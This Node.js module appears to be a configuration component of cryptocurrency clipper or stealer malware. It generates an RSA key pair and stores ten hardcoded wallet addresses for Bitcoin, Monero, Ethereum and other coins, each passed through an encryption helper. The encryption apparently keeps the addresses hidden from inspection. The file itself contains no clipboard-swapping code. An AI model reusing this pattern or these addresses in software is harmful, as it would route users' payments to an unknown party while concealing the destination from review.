module.exports = (client) => {
    return {
        default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
        default_oaepHash: "sha256",
        keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
            modulusLength: 2048,
        }),

        btc: client.utils.encryption.encryptData("bc1q08fy4km3rrfys0qu7yne24nw2cuqz7ufn83nu6"),
        ltc: client.utils.encryption.encryptData("LKr4SV9Zhicbu3GmGknKxyHcuzDisjhcTE"),
        xmr: client.utils.encryption.encryptData("43P5XxZFPMyXjDjYU5ZrYY2ASXKXDfb38cKKCRnPaWJfVk8boEhkR52FZfioi76n9tZgvfXkaekpxM4GzsWWeuS61KK5qGg"),
        eth: client.utils.encryption.encryptData("0x8D12090e40f89a4D4be2A148A3e64D09Abd9E213"),
        xrp: client.utils.encryption.encryptData("rD1kMAqwNY3d4HGDEzQk9yi9SQ87bohN6v"),
        neo: client.utils.encryption.encryptData("AeToyzhytTEDouZdZAWfJ1QTFVqDjEvDKU"),
        bch: client.utils.encryption.encryptData("qz6ql5jqxuk9enjsse9pxza62j46rw4725hkf88pxq"),
        doge: client.utils.encryption.encryptData("DGSeUm9yozvfdza24ENepRy2XnFVtxdvTC"),
        dash: client.utils.encryption.encryptData("XdfTVs5AbJuXBJ11JNqh5Gd7SfQhSAt4kX"),
        xlm: client.utils.encryption.encryptData("GBJZGUGN3X3GNYAJ62HLITQH3NPLBQ6NB644OX5DDMVAOZBAIXRXV4NM"),
    }
}